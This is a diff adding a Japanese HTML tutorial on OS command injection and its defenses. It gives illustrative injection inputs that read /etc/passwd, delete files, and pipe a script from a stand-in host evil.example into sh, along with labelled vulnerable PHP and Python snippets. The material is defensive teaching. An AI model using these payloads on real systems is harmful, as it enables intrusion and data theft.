@@ -1,0 +1,523 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSコマンドインジェクション｜Web脆弱性対策解説</title>
+<link rel="stylesheet" href="../../_解説HTML/style.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="site" href="00-0_目次.html">Web脆弱性対策解説</a>
+    <span class="crumb"><a href="00-0_目次.html">目次</a> › 20 インジェクション › OSコマンドインジェクション</span>
+    <button class="toc-btn" type="button">目次</button>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="toc" id="toc"><p class="toc-title">このページの目次</p><ol id="toc-list"></ol></nav>
+
+  <main>
+    <div class="hero">
+      <span class="eyebrow">20 インジェクション</span>
+      <h1>OSコマンドインジェクション</h1>
+      <p class="lead">Webアプリは、画像変換・バックアップ・外部ツール連携などで OS のコマンドを呼び出すことがあります。そのときに起きやすいのが OSコマンド・インジェクションです。外部からの入力がサーバーへの命令として実行されてしまう仕組みと被害、そして「そもそもコマンドを呼ばない」から「最小権限で動かす」までの対策を、優先度の高い順に解説します（徳丸本 第14章）。</p>
+      <p class="meta">もとにしたノート：20_インジェクション/05_OSコマンド呼び出しの際に発生する脆弱性（徳丸本14章）</p>
+    </div>
+
+    <div class="callout key">
+      <p class="callout-title">ひとことで言うと</p>
+      <p>入力値を <strong>1本のコマンド文字列に連結してシェルに渡す</strong> と、<code>;</code> や <code>|</code> などの記号で <strong>攻撃者の命令を追加</strong> されてしまいます。いちばんの対策は <strong>OS コマンドを呼ばない</strong> こと、次に <strong>シェルを介さずコマンドと引数を分けて渡す</strong> ことです。</p>
+    </div>
+
+    <h2 id="sec-1"><span class="num">1.</span>OSコマンド・インジェクションの概要</h2>
+    <p><strong>OSコマンド・インジェクション（OS Command Injection）</strong> とは、外部から渡された文字列をそのまま OS のコマンドとして実行してしまい、<strong>攻撃者が意図した別のコマンドまで動かされてしまう</strong> 脆弱性です。<strong>OS コマンド</strong> とは、<code>ping</code>・<code>cp</code>・<code>convert</code> など、サーバーの OS 上で動くプログラムをコマンドラインから起動する命令のことです。</p>
+    <p><a href="20-3_SQLインジェクション.html">SQLインジェクション</a> が「データベースへの命令」を注入するのに対し、こちらは <strong>「OS（サーバー本体）への命令」</strong> を注入する攻撃です。影響範囲がサーバー全体に及ぶため、非常に危険です。インジェクション全般の考え方は <a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html">インジェクションと暗号化の不備</a> も参照してください。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>内容</th></tr></thead>
+      <tbody>
+        <tr><td><strong>分類</strong></td><td>インジェクション系脆弱性</td></tr>
+        <tr><td><strong>インターフェース</strong></td><td>OS のシェル（コマンドライン）</td></tr>
+        <tr><td><strong>悪用手口</strong></td><td>シェルのメタ文字などを混ぜて、別コマンドを実行させる</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-1-1">1.1 日常生活での例え</h3>
+    <div class="grid c2">
+      <div class="card"><h4>正常なコマンド実行</h4><p>「この画像をリサイズして」と頼むと、<strong>その作業だけ</strong> が行われる。</p></div>
+      <div class="card"><h4>攻撃された場合</h4><p>「この画像をリサイズして。<strong>ついでに金庫の鍵も開けて</strong>」と書かれ、頼んでいない作業まで実行される。</p></div>
+    </div>
+
+    <h3 id="sec-1-2">1.2 なぜ危険か</h3>
+    <p>Webアプリが OS コマンドを実行できるということは、<strong>サーバー上でプログラムを動かす権限</strong> を持っているということです。その権限が乗っ取られると、次のような被害が出ます。</p>
+<pre><code>・攻撃用ツールを外部からダウンロードされる
+・ダウンロードしたツールに実行権限を与えられる
+・OSの脆弱性を内部から攻撃され、管理者権限を奪われる
+・Webサーバーが攻撃者の思いのままになる</code></pre>
+    <p>一度サーバーを乗っ取られると、Webアプリの範囲を超えて、OS 全体が危険にさらされます。</p>
+
+    <h2 id="sec-2"><span class="num">2.</span>OSコマンド・インジェクションとは</h2>
+
+    <h3 id="sec-2-1">2.1 シェルとメタ文字（攻撃を読むために）</h3>
+    <p>OS コマンドは、多くの場合 <strong>シェル</strong>（<code>bash</code> や <code>cmd.exe</code> など）経由で実行されます。シェルとは、人が打ち込んだコマンド文字列を読み取って解釈し、プログラムを起動する「通訳」役のプログラムです。シェルは、特別な意味を持つ文字（<strong>メタ文字</strong>）を解釈します。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>メタ文字（例）</th><th>意味</th></tr></thead>
+      <tbody>
+        <tr><td><code>;</code></td><td>コマンドの区切り（前のコマンドのあとに別コマンドを実行）</td></tr>
+        <tr><td><code>|</code></td><td>パイプ（前の結果を次のコマンドへ渡す）</td></tr>
+        <tr><td><code>&amp;</code> / <code>&amp;&amp;</code></td><td>バックグラウンド実行 / 前が成功したら次を実行</td></tr>
+        <tr><td><code>`</code> や <code>$()</code></td><td>コマンド置換（中のコマンドを実行して結果を埋め込む）</td></tr>
+        <tr><td><code>&gt;</code> / <code>&gt;&gt;</code></td><td>出力のリダイレクト（ファイルへ書き込み）</td></tr>
+        <tr><td>改行</td><td>コマンドの区切りとして扱われることがある</td></tr>
+      </tbody>
+    </table></div>
+    <p>これらの文字が <strong>エスケープ（無害化）されずに</strong> コマンド文字列に入ると、攻撃者は「本来のコマンド」のあとに <strong>自分のコマンドを追加</strong> できます。エスケープとは、特別な意味を持つ文字を「ただの文字」として扱われる形に変換することです。</p>
+
+    <h3 id="sec-2-2">2.2 攻撃のイメージ</h3>
+    <p>たとえば、ホスト名の疎通確認（<strong>ping</strong>：相手のサーバーに届くかを確かめるコマンド）を行う機能が次のような URL だとします。</p>
+<pre><code>https://example.com/ping.php?host=example.com</code></pre>
+    <p>アプリが <code>host</code> パラメータをそのままコマンドに連結している場合：</p>
+<pre><code>【正常な入力】
+host=example.com
+→ ping example.com を実行（想定どおり）
+
+【攻撃者の入力】
+host=example.com; cat /etc/passwd
+→ ping example.com; cat /etc/passwd を実行
+→ ping のあとに、パスワード関連ファイルの内容表示まで実行される</code></pre>
+    <p><code>;</code> は「ここでコマンドを区切る」という意味です。そのため、本来の <code>ping</code> のあとに、攻撃者が指定した別コマンドが動きます。<code>cat</code> はファイルの中身を表示するコマンド、<code>/etc/passwd</code> は Linux のユーザー一覧が書かれたファイルです。</p>
+<pre><code>【別の攻撃例】
+host=example.com &amp;&amp; curl http://evil.example/malware.sh | sh
+→ 外部から攻撃用スクリプトをダウンロードして実行する</code></pre>
+    <p><code>curl</code> は URL の内容を取得するコマンドです。取得したスクリプトを <code>|</code>（パイプ）で <code>sh</code>（シェル）に渡し、そのまま実行させています。</p>
+
+    <h3 id="sec-2-3">2.3 攻撃の流れ</h3>
+    <ol class="steps">
+      <li>攻撃者が「外部入力を OS コマンドに渡す」機能を見つける</li>
+      <li><code>;</code> や <code>|</code> などのメタ文字を含む値を送る</li>
+      <li>アプリが入力値をそのままコマンド文字列に連結する</li>
+      <li>シェルがメタ文字を解釈し、追加コマンドを実行する</li>
+      <li>ファイル閲覧・改ざん、外部通信、権限昇格などが起きる</li>
+    </ol>
+
+    <h2 id="sec-3"><span class="num">3.</span>何ができるか（被害）</h2>
+    <p>OSコマンド・インジェクションが成功すると、Webアプリが動いているユーザー権限の範囲で、ほぼ何でもできます。</p>
+
+    <h3 id="sec-3-1">3.1 サーバー乗っ取りまでの典型的な流れ</h3>
+    <p>攻撃者は、いきなり管理者になるのではなく、段階的に権限を広げていくことが多いです。一般ユーザーの権限から管理者の権限へ広げることを <strong>権限昇格</strong> といいます。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>段階</th><th>攻撃者がやること</th><th>目的</th></tr></thead>
+      <tbody>
+        <tr><td><strong>1</strong></td><td>攻撃用ツールを外部からダウンロード</td><td>侵入後に使う道具を用意する</td></tr>
+        <tr><td><strong>2</strong></td><td>ダウンロードしたツールに実行権限を与える</td><td>ツールを動かせるようにする</td></tr>
+        <tr><td><strong>3</strong></td><td>OS の脆弱性を内部から攻撃する</td><td>一般ユーザーから管理者権限へ昇格する</td></tr>
+        <tr><td><strong>4</strong></td><td>Webサーバーを完全に掌握する</td><td>好きな操作をいつでもできるようにする</td></tr>
+      </tbody>
+    </table></div>
+<pre><code>【イメージ】
+
+外部入力
+  ↓
+OSコマンド・インジェクション成功
+  ↓
+Webアプリの権限でコマンド実行できる
+  ↓
+攻撃ツールのダウンロード・実行
+  ↓
+OSの脆弱性を突いて管理者権限を取得
+  ↓
+サーバー全体が攻撃者の思いのまま</code></pre>
+
+    <h3 id="sec-3-2">3.2 具体的な被害例</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>被害</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Webサーバー内のファイルの閲覧・改ざん・削除</strong></td><td>設定ファイル、ソースコード、個人情報の漏洩や改ざん。サイトの破壊も可能</td></tr>
+        <tr><td><strong>外部へのメールの送信</strong></td><td>迷惑メールやなりすましメールの踏み台にされる</td></tr>
+        <tr><td><strong>別のサーバーへの攻撃</strong></td><td>社内ネットワークや他サイトへの攻撃の起点（踏み台）になる</td></tr>
+        <tr><td><strong>暗号通貨の採掘</strong></td><td>サーバーの CPU / GPU を勝手に使われ、電気代や性能低下の被害が出る</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>踏み台</strong> とは、攻撃者が自分の正体を隠すために、乗っ取ったサーバーを経由して別の相手を攻撃することです。ファイルを読まれるだけでも危険ですが、書き込みや外部通信までできると、<strong>自社サーバーが攻撃の拠点</strong> になります。被害は自社サイトにとどまりません。</p>
+
+    <h2 id="sec-4"><span class="num">4.</span>脆弱性が生まれる原因</h2>
+    <p>次の条件がそろうと、OSコマンド・インジェクションが起きやすくなります。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>原因</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>シェルのメタ文字がエスケープされていない</strong></td><td><code>;</code> <code>|</code> <code>&amp;</code> などがそのままコマンド文字列に入り、シェルに解釈される</td></tr>
+        <tr><td><strong>シェル機能を呼び出せる関数を使っている</strong></td><td>シェル経由でコマンドを実行する API を使っている</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-4-1">4.1 原因1：シェルのメタ文字がエスケープされていない</h3>
+    <p>外部入力をコマンド文字列に連結するとき、メタ文字を無害化していないと、入力が「データ」ではなく「命令」として扱われます。</p>
+    <p class="code-label bad">✕ 危険：外部入力をそのままコマンドに連結</p>
+<pre><code>// ❌ 危険: 外部入力をそのままコマンドに連結
+$host = $_GET['host'];
+system("ping -c 1 " . $host);</code></pre>
+<pre><code>入力: example.com; rm -rf /tmp/important
+実行されるコマンド:
+  ping -c 1 example.com; rm -rf /tmp/important</code></pre>
+    <p><code>example.com</code> はデータとして渡したつもりでも、<code>;</code> 以降は別コマンドとして実行されます。<code>rm -rf</code> はファイルやフォルダを確認なしで丸ごと削除するコマンドです。</p>
+
+    <h3 id="sec-4-2">4.2 原因2：シェル機能を呼び出せる関数を使っている</h3>
+    <p>言語には、<strong>シェル経由でコマンドを実行する関数</strong> と、<strong>シェルを介さず直接プログラムを起動する関数</strong> があります。前者を使うと、メタ文字が解釈されやすく危険です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>言語</th><th>シェル経由になりやすい例</th><th>比較的安全な方向性</th></tr></thead>
+      <tbody>
+        <tr><td><strong>PHP</strong></td><td><code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, バッククォート</td><td><code>proc_open()</code> で引数を配列渡し、など</td></tr>
+        <tr><td><strong>Perl</strong></td><td><code>system("cmd $input")</code>、<code>open(PIPE, "| cmd $input")</code></td><td><code>system(@args)</code>、<code>sysopen</code>、リスト形式の呼び出し</td></tr>
+        <tr><td><strong>Python</strong></td><td><code>os.system()</code>, <code>subprocess</code> の <code>shell=True</code></td><td><code>subprocess.run([...], shell=False)</code></td></tr>
+        <tr><td><strong>Ruby</strong></td><td><code>`cmd`</code>、<code>system("cmd #{input}")</code></td><td><code>system("cmd", arg1, arg2)</code> のように引数分離</td></tr>
+      </tbody>
+    </table></div>
+    <p>ポイントは、<strong>「1本の文字列としてシェルに渡す」か「コマンドと引数を分けて渡す」か</strong> です。文字列で渡すとシェルがメタ文字を解釈します。</p>
+<pre><code>❌ 危険（シェルが解釈する）
+  "ping -c 1 " + userInput
+  → シェルが ; や | を命令として扱う
+
+✅ 安全寄り（引数として渡す）
+  ["ping", "-c", "1", userInput]
+  → userInput は「ただの文字列」として扱われやすい</code></pre>
+
+    <figure>
+    <svg viewBox="0 0 720 350" role="img" aria-label="文字列をシェルに渡すと、セミコロンで区切られてpingに加えてcatコマンドも実行される。引数を分けてシェルを介さず渡すと、pingだけが起動し、入力全体が1つのホスト名として扱われる">
+      <defs>
+        <marker id="arw204a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead"/></marker>
+        <marker id="arw204b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead-bad"/></marker>
+      </defs>
+      <text x="20" y="24" class="d-text-bold">✕ シェル経由（1本の文字列で渡す）</text>
+      <rect x="20" y="50" width="150" height="60" rx="8" class="d-box"/>
+      <text x="95" y="76" text-anchor="middle" class="d-text-bold">Webアプリ</text>
+      <text x="95" y="96" text-anchor="middle" class="d-text-sub">system() など</text>
+      <text x="204" y="72" text-anchor="middle" class="d-text-sub">文字列</text>
+      <line x1="170" y1="80" x2="238" y2="80" class="d-line" marker-end="url(#arw204a)"/>
+      <rect x="240" y="50" width="130" height="60" rx="8" class="d-box-warn"/>
+      <text x="305" y="76" text-anchor="middle" class="d-text-bold">シェル（sh）</text>
+      <text x="305" y="96" text-anchor="middle" class="d-text-sub">; を区切りと解釈</text>
+      <line x1="370" y1="72" x2="438" y2="60" class="d-line" marker-end="url(#arw204a)"/>
+      <line x1="370" y1="90" x2="438" y2="120" class="d-line-bad" marker-end="url(#arw204b)"/>
+      <rect x="440" y="40" width="260" height="40" rx="8" class="d-box"/>
+      <text x="570" y="65" text-anchor="middle" class="d-text">① ping -c 1 example.com</text>
+      <rect x="440" y="100" width="260" height="40" rx="8" class="d-box-bad"/>
+      <text x="570" y="125" text-anchor="middle" class="d-text-bold">② cat /etc/passwd も実行</text>
+      <text x="360" y="172" text-anchor="middle" class="d-text-sub">渡す文字列："ping -c 1 example.com; cat /etc/passwd"</text>
+      <line x1="20" y1="192" x2="700" y2="192" class="d-line-dash"/>
+      <text x="20" y="220" class="d-text-bold">○ シェルを介さない（コマンドと引数を分けて渡す）</text>
+      <rect x="20" y="240" width="150" height="70" rx="8" class="d-box"/>
+      <text x="95" y="270" text-anchor="middle" class="d-text-bold">Webアプリ</text>
+      <text x="95" y="290" text-anchor="middle" class="d-text-sub">subprocess.run(list)</text>
+      <text x="304" y="266" text-anchor="middle" class="d-text-sub">引数の配列（シェルなし）</text>
+      <line x1="170" y1="275" x2="438" y2="275" class="d-line" marker-end="url(#arw204a)"/>
+      <rect x="440" y="240" width="260" height="70" rx="8" class="d-box-good"/>
+      <text x="570" y="262" text-anchor="middle" class="d-text-bold">ping だけが起動</text>
+      <text x="570" y="281" text-anchor="middle" class="d-text-sub">「example.com; cat /etc/passwd」</text>
+      <text x="570" y="298" text-anchor="middle" class="d-text-sub">を1つのホスト名として扱う</text>
+      <text x="360" y="338" text-anchor="middle" class="d-text-sub">渡す配列：["ping", "-c", "1", "example.com; cat /etc/passwd"]</text>
+    </svg>
+    <figcaption>図：シェルが間にいると ; で2つ目のコマンドが始まる。シェルを通さなければ ; はただの文字</figcaption>
+    </figure>
+
+    <h2 id="sec-5"><span class="num">5.</span>OSコマンド・インジェクションの対策</h2>
+    <p>対策は、優先度の高いものから順に考えます。</p>
+<pre><code>【対策の優先順位】
+
+1. OSコマンド呼び出し自体を使わない
+2. シェル経由の関数を使わない
+3. 外部入力をコマンドのパラメータに渡さない
+4. どうしても渡すなら、安全な方法でエスケープ / 検証する
+5. 被害を抑える（権限最小化・パッチ適用）</code></pre>
+    <p>最も安全なのは <strong>「そもそも OS コマンドを呼ばない」</strong> ことです。エスケープは最後の手段に近い位置づけです。</p>
+
+    <h3 id="sec-5-1">5.1 OSコマンド呼び出しを使わない実装方法を選択する</h3>
+    <p>同じ機能でも、OS コマンドを使わずに実現できることがよくあります。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>やりたいこと</th><th>OSコマンドに頼りがちな例</th><th>コマンドを使わない例</th></tr></thead>
+      <tbody>
+        <tr><td><strong>画像のリサイズ</strong></td><td><code>convert</code>（ImageMagick）を <code>system</code> で呼ぶ</td><td>画像処理ライブラリ（GD、Imagick 拡張など）を API として使う</td></tr>
+        <tr><td><strong>PDF の生成</strong></td><td>外部コマンドで変換</td><td>言語用の PDF ライブラリを使う</td></tr>
+        <tr><td><strong>ファイル操作</strong></td><td><code>rm</code> <code>cp</code> <code>cat</code> を実行</td><td>言語標準のファイル API を使う</td></tr>
+        <tr><td><strong>疎通確認</strong></td><td><code>ping</code> を実行</td><td>そもそもユーザー向けに公開しない / 専用ライブラリを使う</td></tr>
+      </tbody>
+    </table></div>
+    <p class="code-label bad">✕ 危険：OS コマンドでファイルを読む</p>
+<pre><code>// ❌ 危険: OS コマンドでファイルを読む
+system("cat " . $filename);</code></pre>
+    <p class="code-label good">○ 良い例：言語のファイル API を使う</p>
+<pre><code>// ✅ 良い例: 言語のファイル API を使う
+$content = file_get_contents($filename);</code></pre>
+    <p>ライブラリや言語標準機能で足りるなら、<strong>OS コマンド呼び出しは避ける</strong> のが第一選択です。</p>
+    <div class="callout warn">
+      <p class="callout-title">補足：ファイル名の扱いは別の問題が残ります</p>
+      <p><code>file_get_contents()</code> にすれば OS コマンドは動きませんが、<code>$filename</code> が外部入力なら <code>../</code> などで想定外のファイルを読まれる危険（ディレクトリ・トラバーサル）は残ります。ファイル名を外部から受け取る場合の注意は <a href="20-6_ファイルインクルード.html">ファイルインクルード</a> も参照してください。</p>
+    </div>
+
+    <h3 id="sec-5-2">5.2 シェル呼び出し機能のある関数の利用を避ける</h3>
+    <p>どうしても外部プログラムを起動する場合は、<strong>シェルを介さない呼び出し方</strong> を選びます。</p>
+    <p class="code-label">PHP の例</p>
+<pre><code>// ❌ 危険: シェル経由（メタ文字が解釈される）
+$host = $_GET['host'];
+system("ping -c 1 " . $host);
+
+// ✅ 良い例の方向性: 引数を分離して渡す（シェルを介さない）
+// PHP では proc_open などで引数配列を渡す方法がある
+$cmd = ['ping', '-c', '1', $host];
+// $host は「ping の引数」として扱われ、; はただの文字になる</code></pre>
+    <div class="callout tip">
+      <p class="callout-title">補足：proc_open に配列を渡す書き方</p>
+      <p>PHP 7.4 以降では、<code>proc_open()</code> の第1引数に配列を渡すと、シェルを介さずに直接プログラムを起動します。</p>
+<pre><code>$proc = proc_open($cmd, [1 =&gt; ['pipe', 'w']], $pipes);</code></pre>
+    </div>
+    <p class="code-label">Python の例</p>
+<pre><code># ❌ 危険
+os.system("ping -c 1 " + host)
+subprocess.run("ping -c 1 " + host, shell=True)
+
+# ✅ 良い例: shell=False（デフォルト）でリスト渡し
+subprocess.run(["ping", "-c", "1", host], shell=False)</code></pre>
+    <p>シェルを介さない場合、<code>;</code> や <code>|</code> は「コマンドの区切り」ではなく、<strong>ファイル名やホスト名の一部というただの文字</strong> として渡されます（上の図の下段）。</p>
+
+    <h4>Perl の場合：<code>open</code> の代わりに <code>sysopen</code> を使う</h4>
+    <p>Perl では、<code>open</code> の使い方によってシェルが起動することがあります。ファイルを開くだけなら、<strong><code>sysopen</code></strong> や <strong>モードを明示した <code>open</code></strong> を使います。</p>
+    <p class="code-label bad">✕ 危険になりやすい例</p>
+<pre><code># ❌ 危険になりやすい: ファイル名にメタ文字が含まれるとシェルが動くことがある
+open(my $fh, $filename);</code></pre>
+    <p class="code-label good">○ 良い例</p>
+<pre><code># ✅ 良い例: sysopen でファイルを開く（シェルを介さない）
+use Fcntl qw(O_RDONLY);
+sysopen(my $fh, $filename, O_RDONLY) or die $!;
+
+# ✅ 良い例: open でもモードを明示する（3引数形式）
+open(my $fh, '&lt;', $filename) or die $!;</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>書き方</th><th>安全性</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong><code>open(FH, $filename)</code></strong></td><td>危険になりやすい</td><td>ファイル名の内容次第でパイプやシェルが動くことがある</td></tr>
+        <tr><td><strong><code>open(FH, '&lt;', $filename)</code></strong></td><td>安全寄り</td><td>読み取りモードを明示し、ファイルとして開く</td></tr>
+        <tr><td><strong><code>sysopen</code></strong></td><td>安全寄り</td><td>低レベルなファイルオープン。シェルを介さない</td></tr>
+      </tbody>
+    </table></div>
+    <p>たとえば2引数の <code>open</code> では、ファイル名が <code>| cmd</code> で始まったり <code>cmd |</code> で終わったりすると、ファイルではなくコマンドとして起動されます。「ファイルを開きたいだけなのに、気づかないうちにコマンド実行できてしまう」のが典型的な落とし穴です。<strong>意図がファイルオープンなら、コマンド実行経路のない API を使う</strong> のがポイントです。</p>
+
+    <h3 id="sec-5-3">5.3 外部から入力された文字列をコマンドラインのパラメータに渡さない</h3>
+    <p>シェルを介さない呼び出しでも、外部入力をコマンドの引数に渡すと、別の問題が起きることがあります（想定外のオプション指定など）。たとえば入力が <code>-</code> で始まると、コマンドはそれを「データ」ではなく <strong>オプション（動作を切り替える指定）</strong> として受け取ってしまいます。</p>
+    <p>最も安全なのは、<strong>外部入力をコマンドラインに一切渡さない</strong> ことです。</p>
+<pre><code>❌ 悪い例
+  /convert.php?file=user_upload.png
+  → ユーザーが指定したファイル名をそのままコマンド引数にする
+
+✅ 良い例
+  /convert.php?id=123
+  → ID だけ受け取り、サーバー側で実ファイルパスや処理内容を決める</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>方針</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>ID で管理する</strong></td><td>DB に「ID ↔ 実データ」を持ち、外部には ID だけ渡す</td></tr>
+        <tr><td><strong>サーバー側で固定する</strong></td><td>実行するコマンドや引数をアプリが決め打ちする</td></tr>
+        <tr><td><strong>許可リスト（ホワイトリスト）</strong></td><td>「small」「large」など、決まった値だけ受け付ける</td></tr>
+      </tbody>
+    </table></div>
+    <p class="code-label good">○ 良い例：外部入力は ID のみ</p>
+<pre><code>// ✅ 良い例: 外部入力は ID のみ。コマンド引数はサーバー側で決める
+$id = (int)($_GET['id'] ?? 0);
+
+// DB から許可されたファイルパスを取得（ユーザー入力そのものではない）
+$path = findAllowedPathById($id);
+if ($path === null) {
+    exit('不正な指定です');
+}
+
+// どうしても外部コマンドが必要なら、サーバーが決めたパスだけ渡す
+// ※ 可能ならライブラリ利用に置き換える</code></pre>
+    <p><code>(int)</code> は値を整数に変換する書き方で、数字以外の文字はここで取り除かれます。<code>findAllowedPathById()</code> は「ID から許可済みのパスを探す」ための架空の関数です。</p>
+
+    <h3 id="sec-5-4">5.4 OSコマンドに渡すパラメータを安全な関数によりエスケープする</h3>
+    <p>やむを得ず外部入力をコマンドに渡す場合は、<strong>その言語・環境向けの安全なエスケープ関数</strong> を使います。自分で <code>;</code> を消すだけ、といった独自処理は漏れやすく危険です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>言語</th><th>エスケープの例</th></tr></thead>
+      <tbody>
+        <tr><td><strong>PHP</strong></td><td><code>escapeshellarg()</code>（引数用）、<code>escapeshellcmd()</code>（コマンド用 ※用途に注意）</td></tr>
+        <tr><td><strong>Perl</strong></td><td><code>String::ShellQuote</code> など</td></tr>
+        <tr><td><strong>Python</strong></td><td>そもそも <code>shell=False</code> ＋ リスト渡しを優先。文字列結合しない</td></tr>
+      </tbody>
+    </table></div>
+    <p class="code-label">どうしてもシェル経由が必要な場合（最終手段）</p>
+<pre><code>// どうしてもシェル経由が必要な場合の例（最終手段）
+$host = $_GET['host'] ?? '';
+
+// 引数として安全にクォートする
+$safeHost = escapeshellarg($host);
+system("ping -c 1 " . $safeHost);</code></pre>
+    <p><code>escapeshellarg()</code> は値全体をシングルクォート <code>'…'</code> で囲み、シェルに「ひとかたまりの文字列」として渡す関数です（<strong>クォート</strong>＝引用符で囲むこと）。一方 <code>escapeshellcmd()</code> はコマンド文字列全体のメタ文字をエスケープするもので、引数1つずつの無害化には向きません。引数には <code>escapeshellarg()</code> を使います。</p>
+    <p>ただし、エスケープは <strong>ミスや関数の誤用が起きやすい</strong> です。可能なら「コマンドを使わない」「シェルを介さない」「外部入力を渡さない」を優先してください。</p>
+
+    <h4>パラメータをシェルの環境変数経由で渡す</h4>
+    <p>別の安全寄りの方法として、<strong>値をコマンドライン引数ではなく環境変数で渡し、スクリプト側で参照する</strong> やり方があります。<strong>環境変数</strong> とは、起動するプログラムに「名前＝値」の形で受け渡せる設定値のことです。</p>
+<pre><code>【考え方】
+
+❌ コマンドラインに直接埋め込む
+  system("process.sh " . $userInput);
+  → メタ文字がコマンド文字列に混ざる
+
+✅ 環境変数経由で渡す
+  環境変数 VALUE=$userInput を設定
+  system("process.sh");  ※ 引数にはユーザー入力を付けない
+  process.sh の中で $VALUE を参照</code></pre>
+    <p>コマンドライン文字列にユーザー入力が現れないため、シェルのメタ文字解釈を避けやすくなります。ただし、呼び出し方やスクリプト側の扱いを誤ると別の問題になるため、<strong>「引数を分離して渡す」「そもそもコマンドを使わない」</strong> の方が分かりやすく安全です。</p>
+
+    <h3 id="sec-5-5">5.5 パラメータの検証</h3>
+    <p>エスケープとあわせて、<strong>受け付ける値の形式を厳しく制限</strong> します。</p>
+    <p class="code-label good">○ ホスト名として許される文字だけ通す（例）</p>
+<pre><code>// ✅ ホスト名として許される文字だけ通す（例）
+$host = $_GET['host'] ?? '';
+
+if (!preg_match('/\A[a-zA-Z0-9.-]+\z/', $host)) {
+    exit('不正なホスト名です');
+}
+
+// 長さ制限もあるとよい
+if (strlen($host) &gt; 253) {
+    exit('不正なホスト名です');
+}</code></pre>
+    <p><code>preg_match</code> は正規表現（文字のパターン）に一致するかを調べる関数で、<code>\A</code> と <code>\z</code> は「文字列の先頭」と「文字列の末尾」を表します。途中に1文字でも許可外の文字があれば拒否されます。</p>
+    <div class="callout warn">
+      <p class="callout-title">補足：先頭のハイフンにも注意</p>
+      <p>この正規表現は <code>-</code> を許可しているため、<code>-f</code> のような <strong>先頭がハイフンの値</strong> も通ってしまいます。これは <code>ping</code> にオプションとして解釈されるおそれがあります（5.3 の「想定外のオプション指定」）。先頭を英数字に限定する（例：<code>/\A[a-zA-Z0-9][a-zA-Z0-9.-]*\z/</code>）か、対応するコマンドなら引数の前に <code>--</code>（「ここから先はオプションではない」という印）を置くと安全です。</p>
+    </div>
+    <div class="table-wrap"><table>
+      <thead><tr><th>検証の例</th><th>効果</th></tr></thead>
+      <tbody>
+        <tr><td><strong>英数字と一部記号だけ許可</strong></td><td><code>;</code> <code>|</code> <code>&amp;</code> などをそもそも受け付けない</td></tr>
+        <tr><td><strong>長さ制限</strong></td><td>異常に長い入力を拒否する</td></tr>
+        <tr><td><strong>許可リスト</strong></td><td>決まった選択肢以外を拒否する</td></tr>
+      </tbody>
+    </table></div>
+    <p>許可リスト（「A か B か C だけ」）が使えるなら、それが最も分かりやすく安全です。</p>
+
+    <h3 id="sec-5-6">5.6 被害を抑える対策（多層防御）</h3>
+    <p>インジェクション自体を防ぐのが本筋ですが、万一突破されたときの被害を小さくする対策も重要です。複数の守りを重ねる考え方（<strong>多層防御</strong>）は <a href="../../71_セキュリティ基礎/00_全体像/20-2_深層防御.html">深層防御</a> で詳しく扱っています。</p>
+
+    <h4>アプリケーションの稼働するユーザー権限を最小限にする</h4>
+    <p>Webアプリは、<strong>必要最小限の権限の OS ユーザー</strong> で動かします（考え方は <a href="../../71_セキュリティ基礎/00_全体像/20-1_最小権限とデータ最小化.html">最小権限とデータ最小化</a> を参照）。</p>
+<pre><code>❌ 悪い例
+  root（管理者）権限で Web アプリを動かす
+  → 侵入された瞬間にサーバー全体を掌握される
+
+✅ 良い例
+  専用の低権限ユーザー（例: www-data）で動かす
+  → できる操作が限られ、被害が広がりにくい</code></pre>
+    <p><strong>root</strong> は Linux の管理者ユーザー、<strong>www-data</strong> は Web サーバー用によく使われる低権限ユーザーの名前です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>方針</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>管理者権限で動かさない</strong></td><td>root / Administrator での常時稼働を避ける</td></tr>
+        <tr><td><strong>書き込み先を限定する</strong></td><td>アプリが触れるディレクトリを最小にする</td></tr>
+        <tr><td><strong>不要なコマンドを使えないようにする</strong></td><td>OS 側の権限や実行ファイルの制限</td></tr>
+      </tbody>
+    </table></div>
+    <p>権限が低いと、「管理者権限の奪取」までには追加の攻撃が必要になり、防御の時間を稼げます。</p>
+
+    <h4>Webサーバーの OS やミドルウェアのパッチ適用</h4>
+    <p>攻撃者は、侵入後に <strong>OS やミドルウェアの既知の脆弱性</strong> を使って権限昇格することがあります。<strong>ミドルウェア</strong> は Web サーバーや言語ランタイムなど OS とアプリの間で動くソフトウェア、<strong>パッチ</strong> は脆弱性を修正する更新プログラムです。パッチを当てておくと、その道を塞げます。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>対象</th><th>なぜ必要か</th></tr></thead>
+      <tbody>
+        <tr><td><strong>OS</strong></td><td>カーネルや標準コマンドの脆弱性を塞ぐ</td></tr>
+        <tr><td><strong>Webサーバー</strong></td><td>Apache / Nginx などの既知の穴を塞ぐ</td></tr>
